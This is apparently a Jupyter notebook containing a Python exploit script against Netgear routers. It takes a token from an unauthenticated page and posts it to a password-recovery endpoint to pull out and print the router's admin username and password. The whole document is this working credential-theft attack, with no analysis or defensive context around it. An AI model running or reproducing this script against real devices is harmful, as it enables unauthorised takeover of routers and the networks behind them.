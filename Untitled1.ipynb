{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "import requests\n",
    " \n",
    "def scrape(text, start_trig, end_trig):\n",
    "    if text.find(start_trig) != -1:\n",
    "        return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]\n",
    "    else:\n",
    "        return \"i_dont_speak_english\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "    #disable nasty insecure ssl warning\n",
    "requests.packages.urllib3.disable_warnings()\n",
    "#1st stage - get token\n",
    "ip = '192.168.1.1'\n",
    "port = '80'\n",
    "url = 'http://' + ip + ':' + port + '/'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "try:\n",
    "    r = requests.get(url)\n",
    "except:\n",
    "    url = 'https://' + ip + ':' + port + '/'\n",
    "    r = requests.get(url, verify=False)\n",
    "model = r.headers.get('WWW-Authenticate')\n",
    "if model is not None:\n",
    "    print(\"Attcking: \" + model[13:-1])\n",
    "else:\n",
    "    print(\"not a netgear router\")\n",
    "    sys.exit(0)\n",
    "token = scrape(r.text, 'unauth.cgi?id=', '\\\"')\n",
    "if token == 'i_dont_speak_english':\n",
    "    print(\"not vulnerable\")\n",
    "    sys.exit(0)\n",
    "print(\"token found: \" + token)\n",
    "#2nd stage - pass the token - get the password\n",
    "url = url + 'passwordrecovered.cgi?id=' + token\n",
    "r = requests.post(url, verify=False)\n",
    "#profit\n",
    "if r.text.find('left\\\">') != -1:\n",
    "    username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))\n",
    "    username = scrape(username, '>', '\\'')\n",
    "    password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))\n",
    "    password = scrape(password, '>', '\\'')\n",
    "    if username == \"i_dont_speak_english\":\n",
    "        username = (scrape(r.text[r.text.find('left\\\">'):-1], 'left\\\">', '</td>'))\n",
    "        password = (scrape(r.text[r.text.rfind('left\\\">'):-1], 'left\\\">', '</td>'))\n",
    "else:\n",
    "    print(\"not vulnerable becuse password recovery IS set\")\n",
    "    sys.exit(0)\n",
    "#html encoding pops out of nowhere, lets replace that\n",
    "password = password.replace(\"&#35;\",\"#\")\n",
    "password = password.replace(\"&\",\"&\")\n",
    "print(\"user: \" + username)\n",
    "print(\"pass: \" + password)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
